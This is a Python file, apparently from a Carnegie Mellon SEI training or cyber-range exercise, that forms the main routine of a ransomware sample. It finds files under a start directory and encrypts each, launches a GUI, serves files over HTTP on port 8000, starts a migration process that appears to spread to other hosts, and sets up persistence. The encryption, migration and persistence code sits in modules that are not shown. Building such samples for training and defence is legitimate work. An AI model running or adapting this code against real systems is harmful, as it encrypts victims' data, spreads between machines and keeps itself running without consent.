
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

#!/usr/bin/env python


import os, threading, http.server, socketserver, sys, traceback,subprocess
import migrate, discover, windows
from crypto import check_key, decrypt_all, START_DIR, encrypt_file, check_encrypted
from pathlib import Path
import multiprocessing

class WebThread(threading.Thread):
    def run(self):
        #if ':8000' in subprocess.run("netstat -tulpn",shell=True,capture_output=True).stdout.decode("utf-8"):
        #    return
        try:
            basedir_path = Path("/home/user/")
            os.chdir(basedir_path)
            migrate.create_file()
            Handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("0.0.0.0", 8000), Handler) as httpd:
                print("STARTING SERVER")
                httpd.allow_reuse_address = True
                httpd.allow_reuse_port = True
                httpd.serve_forever()
        except Exception as e:
            print("Server already running")
            #print(str(e))
            #os.system(f"echo {str(e)} >> /home/user/Desktop/web_status")
            #os.system(f"echo {str(traceback.format_exc())} >> /home/user/Desktop/web_status")

class EncryptionThread(threading.Thread):
    def run(self):
        if check_encrypted() == False:
            for f in discover.discoverFiles(START_DIR):
                try:
                    encrypt_file(f)
                except Exception as e:
                    print(f"Error:\t {e}")
            
def main():
    # check if script is running for first time.
    first_run = True if migrate.get_ip() == "123.45.67.175" else False

    web_thread = WebThread()
    web_thread.start()   
    
    if first_run == False:
        gui_proc = multiprocessing.Process(target=windows.run_gui)
        gui_proc.start()

        encryption_thread = EncryptionThread()
        encryption_thread.start()

    migrate_proc = multiprocessing.Process(target=migrate.run_migration)
    migrate_proc.start()

    if first_run == False:
        migrate.persist()

if __name__=="__main__":
    main()
